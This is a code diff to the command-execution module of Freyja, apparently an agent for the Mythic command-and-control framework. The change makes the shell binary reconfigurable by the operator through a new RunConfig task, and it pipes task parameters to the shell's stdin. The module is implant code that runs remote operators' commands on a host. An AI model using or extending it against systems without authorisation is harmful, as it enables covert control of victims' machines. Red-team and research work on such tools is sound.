@@ -2,9 +2,11 @@ package cmd_executor
 
 import (
 	"bufio"
+	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
+	"strings"
 	"time"
 
 	// Freyja
@@ -12,21 +14,19 @@ import (
 	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/pkg/utils/structs"
 )
 
+var cmdBin = "cmd"
+
 // Run - Function that executes the cmd_executor command
 func Run(task structs.Task) {
 	msg := task.NewResponse()
-	cmdBin := "cmd"
 	arg1 := "/C"
-	if _, err := exec.LookPath(cmdBin); err != nil {
-		msg.SetError("Could not find cmd.exe ")
-		task.Job.SendResponses <- msg
-		return
-	}
 
 	// command := exec.Command(cmdBin, arg1, task.Params)
 	// directly passes task.Params as part of the command arguments,
 	// which is necessary for cmd.exe to recognize and execute the command.
 	command := exec.Command(cmdBin, arg1, task.Params)
+
+	command.Stdin = strings.NewReader(task.Params)
 	command.Env = os.Environ()
 
 	stdout, err := command.StdoutPipe()
@@ -117,5 +117,26 @@ func Run(task structs.Task) {
 		task.Job.SendResponses <- msg
 		return
 	}
+	return
+}
+
+type Arguments struct {
+	Cmd_executor string `json:"cmdBin"`
+}
+
+func RunConfig(task structs.Task) {
+	msg := task.NewResponse()
+	args := Arguments{}
+	err := json.Unmarshal([]byte(task.Params), &args)
+	if err != nil {
+		msg.SetError(err.Error())
+		task.Job.SendResponses <- msg
+		return
+	}
+	cmdBin = args.Cmd_executor
+	msg.Completed = true
+	msg.UserOutput = fmt.Sprintf("CmdBin updated")
+
+	task.Job.SendResponses <- msg
 	return
 }
